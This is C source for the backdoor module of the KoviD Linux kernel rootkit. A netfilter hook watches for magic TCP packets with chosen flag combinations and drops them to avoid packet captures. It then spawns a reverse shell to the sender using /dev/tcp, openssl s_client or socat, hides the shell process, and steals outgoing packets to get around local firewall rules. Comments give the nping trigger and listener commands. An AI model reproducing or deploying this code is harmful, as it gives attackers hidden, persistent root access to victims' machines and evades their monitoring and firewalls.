/**
 * Linux Kernel version <= 5.8.0
 * - hash
 *
 *  KoviD rootkit
 */

#include <linux/version.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,14,0)
#include <linux/umh.h>
#else
#include <linux/kmod.h>
#endif
#include <linux/inet.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/netfilter/x_tables.h>
#include <linux/kfifo.h>
#include <linux/kthread.h>
#include "fs.h"
#include "lkm.h"

static LIST_HEAD(iph_node);
struct iph_node_t {
    struct iphdr *iph;
    struct tcphdr *tcph;
    bool established;
    struct list_head list;
};

struct task_struct *tsk_iph = NULL;
#define BD_PATH_NUM 3
#define BD_OPS_SIZE 2
enum {
    RR_NULL,
    RR_NC = 80,
    RR_OPENSSL = 443,
    RR_SOCAT = 444,
    RR_SOCAT_TTY = 445
};
static int allowed_ports[] = {
    RR_NC, RR_OPENSSL, RR_SOCAT, RR_SOCAT_TTY, RR_NULL
};

struct stat_ops_t {
    int kv_port;
    const char *bin[BD_PATH_NUM];
};
static struct stat_ops_t stat_ops[] = {
    /* Adjust if you install the binaries in different locations */
    { .kv_port = RR_OPENSSL,
        { "/usr/bin/openssl", "/bin/openssl", "/var/.openssl" }
    },
    { .kv_port = RR_SOCAT,
        { "/bin/socat", "/var/.socat", "/usr/bin/socat" }
    },
    { .kv_port = RR_NULL }
};

/**
 * Iterate over stat_ops list and query FS
 * whether the binary is available
 * XXX: search from PATH or something instead
 */
static const char *_locate_bdbin(int port) {
    int i, x;
    for (i = 0; i < BD_OPS_SIZE && stat_ops[i].kv_port != RR_NULL; ++i) {
        if (port != stat_ops[i].kv_port) continue;
        for (x = 0; x < BD_PATH_NUM; ++x) {
            struct kstat stat;
            /** return 0 if file is found */
            if (fs_file_stat(stat_ops[i].bin[x], &stat) == 0)
                return stat_ops[i].bin[x];
        }
    }
    return NULL;
}

/**
 * Support kfifo for exchanging
 * data between the packet handler and
 * backdoor code
 */
struct kfifo_priv {
    struct iphdr *iph;
    struct tcphdr *tcph;
    int select;
};

struct nf_priv {
    struct task_struct *task;
};

#define FIFO_SIZE 128
static DECLARE_KFIFO(buffer, struct kfifo_priv *, FIFO_SIZE);

static void _put_fifo(struct kfifo_priv *data) {
    kfifo_put(&buffer, data);
}
static int _get_fifo(struct kfifo_priv **data) {
    return kfifo_get(&buffer, data);
}

static void _free_kfifo_items(void) {
    struct kfifo_priv *data;
    while (!kfifo_is_empty(&buffer)) {
        if (kfifo_get(&buffer, &data))
            kfree(data);
    }
}

/** ops struct for the callback */
static struct nf_hook_ops ops;
static struct nf_hook_ops ops_fw;


static inline bool *_is_task_running(void) {
    static bool running = false;
    return &running;
}

static inline bool *_is_task_fw_bypass_running(void) {
    static bool running = false;
    return &running;
}

/**
 * Callback used for retrieving parent's PID
 */
static int _retrieve_pid_cb(struct subprocess_info *info, struct cred *new) {
    if (info && info->data) {
        pid_t *shellpid = (int*)info->data;
        *shellpid = current->pid;
    }
    return 0;
}

static inline int _check_bdports(int port) {
    int i;
    for (i = 0; allowed_ports[i] != 0; ++i)
        if (port == allowed_ports[i]) {
            return port;
        }
    return 0;
}

static char *_build_bd_command(const char *exe, uint16_t dst_port,
        __be32 saddr, uint16_t src_port) {
    short i;
    char *bd = NULL;
    for (i = 0; allowed_ports[i] != RR_NULL && !bd; ++i) {
        switch (dst_port) {
            case RR_SOCAT_TTY:
                {
                    /**
                     * same as RR_SOCAT but on dst port RR_SOCAT_TTY
                     */
                    //"%s OPENSSL:%s:%s,verify=0 EXEC:\"tail -F -n +1 /var/.<random>\""
                    char *tty = sys_ttyfile();
                    if (tty) {
                        int len;
                        char ip[INET_ADDRSTRLEN+1] = {0};
                        snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
                        len = snprintf(NULL, 0, "%s OPENSSL:%s:%u,verify=0 EXEC:\"tail -F -n +1 %s\"", exe, ip, src_port, tty);
                        if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
                            snprintf(bd, len, "%s OPENSSL:%s:%u,verify=0 EXEC:\"tail -F -n +1 %s\"", exe, ip, src_port, tty);
                    }
                }
                break;
            case RR_SOCAT:
                {
                    /*
                     * openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 30 -out server.crt
                     * cat server.key server.crt > server.pem
                     * socat -d -d OPENSSL-LISTEN:<#PORT>,cert=server.pem,verify=0,fork STDOUT
                     * trigger: nping <IP> --tcp -p RR_SOCAT --flags fin,urg,ack --source-port <#PORT> -c 1
                     */
                    int len;
                    char ip[INET_ADDRSTRLEN+1] = {0};
                    snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
                    len = snprintf(NULL, 0, "%s OPENSSL:%s:%u,verify=0 EXEC:/bin/bash", exe, ip, src_port);
                    if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
                        snprintf(bd, len, "%s OPENSSL:%s:%u,verify=0 EXEC:/bin/bash", exe, ip, src_port);
                }
                break;
            case RR_OPENSSL:
                {
                    /**
                     * openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
                     * openssl s_server -key key.pem -cert cert.pem -accept <#PORT>
                     * trigger: nping <IP> --tcp -p RR_OPENSSL --flags fin,urg,ack --source-port <#PORT> -c 1
                     */
                    char *ssl = sys_sslfile();
                    if (ssl) {
                        int len;
                        char ip[INET_ADDRSTRLEN+1] = {0};

                        snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
                        snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
                        len = snprintf(NULL, 0, "/usr/bin/mkfifo %s; /bin/sh -i < %s 2>&1 | %s s_client -quiet -connect %s:%u > %s",
                                ssl, ssl, exe, ip, src_port, ssl);
                        if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
                            snprintf(bd, len, "/usr/bin/mkfifo %s; /bin/sh -i < %s 2>&1 | %s s_client -quiet -connect %s:%u > %s",
                                    ssl, ssl, exe, ip, src_port, ssl);
                    }
                }
                break;
            case RR_NC:
                {
                    /**
                     * nc <IP> -lvp <#PORT>
                     * trigger: nping <IP> --tcp -p RR_NC --flags fin,urg,ack --source-port <#PORT> -c 1
                     */
                    //"/bin/sh -i >& /dev/tcp/%s/%s 0>&1";
                    int len;
                    char ip[INET_ADDRSTRLEN+1] = {0};
                    snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
                    len = snprintf(NULL, 0, "/bin/sh -i >& /dev/tcp/%s/%u 0>&1", ip, src_port);
                    if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
                        snprintf(bd, len, "/bin/sh -i >& /dev/tcp/%s/%u 0>&1", ip, src_port);
                }
                break;
            default:
                break;
        }
    }
    return bd;
}
/**
 * Execute backdoor that can be either regular
 * or reverse shell
 */
static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int select) {
    char *argv[] = {"/bin/bash", "-c", NULL, NULL};
    char *envp[] = {"HOME=/", "TERM=linux", NULL};
    int ret = -1;
    pid_t shellpid = 0;
    struct subprocess_info *info;
    __be32 saddr = iph->saddr;
    const char *binpath = _locate_bdbin(select == RR_SOCAT_TTY ?
            RR_SOCAT : select);
    char *rev;

    if (select != RR_NC && !binpath) {
        /** do nothing */
        prwarn("Could not find executable associated with port %d\n", select);
        return ret;
    }

    rev = _build_bd_command(binpath, select, saddr, htons(tcph->source));
    if (!rev) {
        /** do nothing */
        prwarn("Invalid port selection: %d\n", select);
        return ret;
    }

    argv[2] = rev;

    if ((info = call_usermodehelper_setup(argv[0], argv, envp,
                    GFP_KERNEL, _retrieve_pid_cb, NULL, &shellpid))) {
        ret = call_usermodehelper_exec(info, UMH_WAIT_EXEC);
    }

    /*
     * wait a little while before the
     * children are ready and inform about new parent PID
     * */
    msleep(100);

    if (!ret) {
        kv_hide_task_by_pid(shellpid, saddr, WHATEVER);
    }

    kv_mem_free(&rev);

    return ret;
}

static int _bd_add_new_iph(struct iphdr *iph, struct tcphdr *tcph) {
    struct iph_node_t *ip = kcalloc(1,
            sizeof(struct iph_node_t) , GFP_KERNEL);
    if (!ip) goto error;

    ip->iph = iph;
    ip->tcph = tcph;
    ip->established = false;
    list_add_tail(&ip->list, &iph_node);
    return 0;
error:
    prerr("Error allocating memory\n");
    return -ENOMEM;
}

bool kv_bd_search_iph_source(__be32 saddr) {
    struct iph_node_t *node, *node_safe;
    list_for_each_entry_safe_reverse(node, node_safe, &iph_node, list) {
        if (node->iph->saddr == saddr) {
            return true;
        }
    }
    return false;
}

bool kv_bd_established(__be32 *daddr, int dport, bool established) {
    bool rc = false;
    struct iph_node_t *node, *node_safe;

    list_for_each_entry_safe_reverse(node, node_safe, &iph_node, list) {
        /**
         * Storing saddr is done at the moment the magic packets are
         * received by pre-routing netfilter hook.
         * The client sends a packet with special flags set and source address
         * is the hint that says: connect to this address and port.
         *
         * That will trigger a local application, socat, nc, etc that will
         * attempt to connect to that particular address:port. When that happens
         * we'll hook those packets in our local out netfilter hook and check
         * the matching here. Packets coming to local out filter will be destined
         * to the same address:port set in pre-routing, but this time they are
         * daddr:dport, hence the swapped check you see here.
         */
        if (node->iph->saddr == *daddr && htons(node->tcph->source) ==  dport) {
            /**
             * Make sure to mark established only once per-connection so
             * they will not loose state.
             * This will make internal references to be kept until
             * connections are closed by clients, when tasks will be unhidden, data
             * freed and the reverse shell(s) killed.
             */
            if (!node->established) {
                node->established = established;
            }

            rc = true;
            break;
        }
    }
    return rc;
}

/**
 * Delete a particular address reference
 */
void kv_bd_cleanup_item(__be32 *saddr) {
    struct iph_node_t *node, *node_safe;
    list_for_each_entry_safe_reverse(node, node_safe, &iph_node, list) {
        if (node->iph->saddr == *saddr) {
            list_del(&node->list);
            kfree(node);
            node = NULL;
            break;
        }
    }
}

/**
 * Can be used in two distinct scenarios:
 *  1 - to remove one single address node if force == false
 *  2 - to otherwise, clean everything
 */
void _bd_cleanup(bool force) {
    struct iph_node_t *node, *node_safe;
    list_for_each_entry_safe(node, node_safe, &iph_node, list) {
        if (!node->established && force) {
            list_del(&node->list);
            kfree(node);
            node = NULL;
        }
    }
}

static int _bd_watchdog_iph(void *unused) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
    struct kernel_syscalls *kaddr = kv_kall_load_addr();
#endif
    while(!kthread_should_stop()) {
        msleep(500);
        _bd_cleanup(false);
    }
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)

              kaddr->k_do_exit(0);
              return 0;
#else
              do_exit(0);
#endif
}

/**
 * Watchdog thread that
 * that is awaken when there is kfifo
 * data.
 */
static int _bd_watchdog(void *t)
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
    struct kernel_syscalls *kaddr = kv_kall_load_addr();
#endif
    set_current_state(TASK_INTERRUPTIBLE);

    while(!kthread_should_stop()) {
        struct kfifo_priv *kf;
        prinfo("Waiting for event\n");

        schedule();
        set_current_state(TASK_INTERRUPTIBLE);

        prinfo("Got event\n");
        /** read data set by nf_hook */
        if (_get_fifo(&kf))
        {
            _run_backdoor(kf->iph, kf->tcph, kf->select);
            kfree(kf);
        }
    }
    __set_current_state(TASK_RUNNING);

    prinfo("BD watchdog OFF\n");
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
              kaddr->k_do_exit(0);
#else
              do_exit(0);
#endif
}

/**
 *  if TCP flags are:
 *  FUCK, CUNT or ASS then you know...
 */
bool kv_check_cursing(struct tcphdr *t) {
    uint8_t fuckoff = 0;
    enum { FUCK=0x8c, CUNT=0xa5, ASS=0x38 };

    fuckoff = t->fin << 7| t->syn << 6| t->rst << 5| t->psh << 4|
        t->ack << 3| t->urg << 2| t->ece <<1| t->cwr;

    //sudo nping <IP> --tcp -p <dst port> --flags <flag1,flag2,...> --source-port <reverse shell port> -c 1
    if (fuckoff == FUCK || fuckoff == CUNT || fuckoff == ASS)
        return true;

    return false;
}

/**
 * NF hook that will set data and
 * wake up backdoor if conditions are met
 */
static unsigned int _sock_hook_nf_cb(void *priv, struct sk_buff *skb,
        const struct nf_hook_state *state) {
    int rc = NF_ACCEPT;
    struct iphdr *iph = (struct iphdr *)skb_network_header(skb);
    switch (iph->protocol) {
        case IPPROTO_TCP: {
                struct nf_priv *user;
                struct kfifo_priv *kf;

                struct tcphdr *tcph = (struct tcphdr *)skb_transport_header(skb);
                int dst = _check_bdports(htons(tcph->dest));

                /** Silence libpcap on CUNT/ASS/FUCK */
                if (dst == RR_NULL || !kv_check_cursing(tcph)) break;

                kf = kzalloc(sizeof(struct kfifo_priv), GFP_KERNEL);
                if (!kf) {
                    prerr("Insufficient memory\n");
                    break;
                }

                kf->iph = iph;
                kf->tcph = tcph;
                kf->select = dst;

                /** setup data so can be read from backdoor code */
                _put_fifo(kf);

                /* Make sure we don't show in libcap */
                _bd_add_new_iph(iph, tcph);

                user = (struct nf_priv*)priv;
                wake_up_process(user->task);

                /** make less noise, drop it here */
                rc = NF_DROP;
            }
            break;
        case IPPROTO_UDP:
            break;
        default:
            break;
    }
    return rc;
}

/**
 * Let's suppose the target has a local netfiler rule similar to the following:
 *
 *  target     prot opt source               destination
 *  DROP       tcp  --  anywhere             <    IP    >         tcp dpt:<port>
 *
 *  Q: How are we supposed to establish a reverse shell to IP:port?
 *  A: By hijacking the netfilter stack: stealing the packet and calling okfn()
 *
 *  NF_STOLEN packets will not continue their route through the chain, hence technically
 *  they will not be blocked but would go nowhere either, unless okfn() is used: to
 *  send the packet out to the wire.
 *
 *  Part of the implementation is dedicated to internal backdoors management: keeping states,
 *  data lifetime, synchronization and more.
 *
 *  Here is a high-level diagram:
 *  .---------------..--------------.      .---------.      .------------.         .-----------..------------------.
 *  |Hacker bdclient||kv pre-routing|      |kv filter|      |revshell app|         |kv inet-out||kv bypass firewall|
 *  '---------------''--------------'      '---------'      '------------'         '-----------''------------------'
 *          |               |                   |                 |                      |               |
 *          |send magic pkts|                   |                 |                      |               |
 *          |-------------->|                   |                 |                      |               |
 *          |               |                   |                 |                      |               |
 *          |               |check match+NF_DROP|                 |                      |               |
 *          |               |------------------>|                 |                      |               |
 *          |               |                   |                 |                      |               |
 *          |               |                   |init revshell app|                      |               |
 *          |               |                   |---------------->|                      |               |
 *          |               |                   |                 |                      |               |
 *          |               |                   |                 |connect-back to Hacker|               |
 *          |               |                   |                 |--------------------->|               |
 *          |               |                   |                 |                      |               |
 *          |               |                   |                 |                      |okfn+NF_STOLEN |
 *          |               |                   |                 |                      |-------------->|
 *          |               |                   |                 |                      |               |
 *          |               |                   |   r00tshell # _ |                      |               |
 *          |<-------------------------------------------------------------------------------------------|
 *  .---------------..--------------.      .---------.      .------------.         .-----------..------------------.
 *  |Hacker bdclient||kv pre-routing|      |kv filter|      |revshell app|         |kv inet-out||kv bypass firewall|
 *  '---------------''--------------'      '---------'      '------------'         '-----------''------------------'
 */
static unsigned int _sock_hook_nf_fw_bypass(void *priv, struct sk_buff *skb,
        const struct nf_hook_state *state) {
    int rc = NF_ACCEPT;
    struct iphdr *iph = (struct iphdr *)skb_network_header(skb);
    switch (iph->protocol) {
        case IPPROTO_TCP: {
                struct tcphdr *tcph = (struct tcphdr *)skb_transport_header(skb);
                int dstport = htons(tcph->dest);
                /**
                 * include/net/tcp_states.h
                 * sk_state carries current connection state of the packet, at this point in time.
                 * What I look for here are for TCP_ESTABLISHED packets that will tell me that, well,
                 * the connection has been completed, therefore that indicates that I can keep the
                 * state and addresses for this connection.
                 *
                 * The established state will only be recorded the first time it comes here and
                 * are kept throughout backdoor's lifetime.
                 * */
                if (kv_bd_established(&iph->daddr,
                            dstport, (skb->sk->sk_state == TCP_ESTABLISHED))) {
                    /**
                     * Kick this packet out to the wire yay!
                     */
                    state->okfn(state->net, state->sk, skb);
                    rc = NF_STOLEN;
                }
            }
            break;
        default:
            break;
    }
    return rc;
}


struct task_struct *kv_sock_start_sniff(void) {
    bool *running = _is_task_running();
    static struct nf_priv priv;
    struct task_struct *tsk = NULL;

    // load sniffer
    if (!*running) {
        // Hook pre routing
        ops.hook = _sock_hook_nf_cb;
        ops.pf = PF_INET;
        /* We'll get the packets before they are routed */
        ops.hooknum = NF_INET_PRE_ROUTING;
        /* High priority in relation to other existent hooks */
        ops.priority = NF_IP_PRI_FIRST;

        INIT_KFIFO(buffer);

        tsk = kthread_run(_bd_watchdog, NULL, THREAD_SOCK_NAME);
        if (!tsk) goto leave;

        tsk_iph = kthread_run(_bd_watchdog_iph, NULL, THREAD_SNIFFER_NAME);
        if (!tsk_iph) {
            kthread_stop(tsk);
            goto leave;
        }
        kv_hide_task_by_pid(tsk_iph->pid, 0, CHILDREN);

        /* Does the magic */
        priv.task = tsk;
        ops.priv = &priv;
        nf_register_net_hook(&init_net, &ops);

        *running = true;
    }
leave:
    return tsk;
}

bool kv_sock_start_fw_bypass(void) {
    bool *running = _is_task_fw_bypass_running();

    if (!*running) {
        // Hook pre routing
        ops_fw.hook = _sock_hook_nf_fw_bypass;
        ops_fw.pf = PF_INET;
        /* Packets generated by local applications that are leaving this host */
        ops_fw.hooknum = NF_INET_LOCAL_OUT;
        /* High priority in relation to other existent hooks */
        ops_fw.priority = NF_IP_PRI_FIRST;

        ops_fw.priv = NULL;
        nf_register_net_hook(&init_net, &ops_fw);

        *running = true;
    }

    return *running;
}

void kv_sock_stop_sniff(struct task_struct *tsk) {
    if (tsk) {
        bool *running = _is_task_running();
        kthread_stop(tsk);
        *running = false;
    }

    if (tsk_iph)
        kthread_stop(tsk_iph);

    nf_unregister_net_hook(&init_net, &ops);

    // unlikely to have remaining
    // but check anyway
    _free_kfifo_items();

    kfifo_free(&buffer);
}

void kv_sock_stop_fw_bypass(void) {
    bool *running = _is_task_fw_bypass_running();
    if (*running) {
        *running = false;
        nf_unregister_net_hook(&init_net, &ops_fw);
    }

    /**
     * Established connections are kept in
     * iph_node until one of them terminates, or
     * KoviD is unloaded. Key here is to always make
     * sure if one BD client exits, all remaining ones
     * are terminated too.
     */
    _bd_cleanup(true);
}
